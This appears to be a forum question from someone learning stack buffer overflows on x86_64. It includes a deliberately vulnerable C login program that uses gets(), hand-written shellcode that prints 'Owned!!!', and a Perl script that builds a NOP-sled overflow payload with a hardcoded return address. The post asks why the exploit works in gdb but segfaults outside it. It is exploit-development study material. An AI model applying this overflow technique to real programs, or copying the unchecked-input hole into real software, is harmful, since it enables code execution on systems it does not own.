  "content": "I been trying to smash the stack in an x86_64 machine , the payload gets executed when I use a debugger (gdb) and fails with Segmentation fault\nwhen I run it normally \n\nHere is the vulnerable program \n\n```\n#include <stdio.h>\n\nchar *secret = \"Password\";\n\nvoid go_shell()\n{\n    char *shell =  \"/bin/sh\";\n    char *cmd[] = { \"/bin/sh\", 0 };\n    printf(\"Would you like to play a game...  \n\");\n    setreuid(0);\n    execve(shell,cmd,0);\n}\n\nint authorize()\n{\n    char password[64];\n    printf(\"Enter Password: \");\n    gets(password);\n    if (!strcmp(password,secret))\n        return 1;\n    else\n        return 0;\n}\n\nint main()\n{\n    if (authorize())\n    {\n        printf(\"login successful  \n\");\n        go_shell();\n    } else {\n        printf(\"Incorrect password  \n\");\n    }\n    return 0;\n}\n\n```\ncompiled as : gcc simple_login.c -o login -z execstack -fno-stack-protector -g\n\nASLR turned off \n\nHere is My payload in assembly \n\n```\nsection .text\nglobal _start\n\n_start:\nxor rax, rax ; syscall\nxor rdi, rdi ; arg1\nxor rsi, rsi ; arg2\nxor rdx, rdx ; arg3\n\n; write(int fd, char *msg, unsigned int len)\nnop\nmov al, 1\ninc di\ninc di\n;Owned!!! =  4f,77,6e,65,64,21,21,21\n;push !,!,!,d\n;push e,n,w,O\nmov rcx,0x21212164656e774f\npush rcx\nmov rsi, rsp\nmov dl, 8 \nsyscall\n\n; exit(int ret)\n;xor rax,rax\nmov al, 0x3c\nxor rdi, rdi\nsyscall\n\n```\n\n\n```\n#!/usr/bin/perl\nprint \"\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\"; // extra padding\nprint \"\\x48\\x31\\xc0\\x48\\x31\\xff\\x48\\x31\\xf6\\x48\\x31\\xd2\";\nprint \"\\xb0\\x01\\x66\\xff\\xc7\\x66\\xff\\xc7\\x48\\xb9\\x4f\\x77\";\nprint \"\\x6e\\x65\\x64\\x21\\x21\\x21\\x51\\x48\\x89\\xe6\\xb2\\x08\";\nprint \"\\x0f\\x05\\xb0\\x3c\\x48\\x31\\xff\\x0f\\x05\";\nprint \"\\x42\\x42\\x42\\x42\\x42\\x42\\x42\\x42\"; // rbp\nprint \"\\xd8\\xe1\\xff\\xff\\xff\\x7f\\x00\\x00\"; //return address\n\n```\nOn debugger \n\n\n\nWhile Executing in a debugger it works fine and the message Owned!!! is printed out , but when I run the file normally I get Segmentation Error \nAny Solution on whats happening here ?  \n\n",
